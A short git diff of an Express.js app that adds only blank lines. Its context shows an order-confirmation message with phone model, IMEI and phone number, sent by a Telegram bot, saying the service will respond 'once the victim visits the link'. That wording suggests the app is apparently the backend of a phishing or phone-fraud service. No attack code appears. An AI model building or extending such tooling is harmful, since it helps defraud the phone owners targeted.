@@ -121,6 +121,7 @@ function ensureAuthenticated(req, res, next) {
 app.get('/',(req,res)=>{
     const errorMessage = req.flash('error')[0];
 
+
     res.render('home', { errorMessage })
 })
 app.get('/register',(req,res)=>{
@@ -512,6 +513,7 @@ console.log(formattedDate)
     const message1 = `Order Confirmation\nOrderID: ${generateOrderId()}\nModel: ${selectedModel}\nIMEI: ${imei}\nPhone Number: ${phoneNumber}\n\n\nWill get back to you once the victim visits the link`;
 
     const groupId = req.user.telegramId; 
+
 
 
     bot.sendMessage(groupId, message1)
